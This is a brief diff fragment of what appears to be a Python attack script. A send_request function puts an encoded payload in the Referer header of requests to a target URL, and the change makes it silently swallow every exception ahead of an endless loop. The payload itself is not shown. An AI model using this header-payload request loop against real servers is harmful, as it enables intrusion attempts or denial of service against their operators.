@@ -11,7 +11,7 @@ def send_request(target_url):
         requests.get(target_url, headers={
             "Referer": encoded_payload
         })
-    except requests.exceptions.ConnectionError:
+    except Exception:
         pass
 
 while True:
